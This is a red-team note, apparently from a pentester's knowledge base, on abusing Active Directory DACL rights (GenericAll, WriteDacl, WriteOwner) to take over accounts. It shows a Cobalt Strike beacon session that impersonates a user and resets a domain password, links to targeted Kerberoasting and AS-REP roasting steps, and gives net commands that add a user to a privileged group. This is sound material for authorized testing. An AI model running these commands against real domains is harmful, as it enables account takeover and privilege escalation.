# Discretionary Access Control Lists (DACL)
A principal has ACLs on more privileged accounts (like via IT-Support OU), that enable them to takeover the account.

Interesting permissions:
* GenericAll
* WriteProperty
* WriteDacl

## WriteDacl
Grant [[Discretionary Access Control Lists (DACL)#GenericAll]] to any principle.

## WriteOwner
Change the ownership of the object to any principal which would then inherit GenericAll over it.

## GenericAll
### Password Reset
⛔ Use NEVER (only with explicit permission of the customer)  
#OPSEC very bad
``````beacon
beacon> getuid
[*] You are EDU\john

beacon> make_token EDU\doe Passw0rd1
[+] Impersonated EDU\john

beacon> run net user jonas Password123. /domain

The request will be processed at a domain controller for domain edu.evil.corp.

The command completed successfully.
``````

### Add SPN for [[Kerberoasting]]
1. Set an SPN via [[PowerView#Change DomainObject (SPN)]]
2. Can be performed via [[Rubeus#Targeted Kerberoasting]]

### Add SPN for [[AS-REP Roasting]]
Modify the User Account Control value on the account to disable preauthentication and then ASREProast it.
1. [[PowerView#Add DONT_REQ_PREAUTH flag]]
2. [[Rubeus#AS-REP Roasting]]

### Add and remove members
* Add join to `SQL Admins`
> run net group "SQL Admins" john /add /domain
* Check johns groups
> run net user john /domain


## Tools
########
########


```meta
ttp: T1000
requirements:
results: 
description: 
```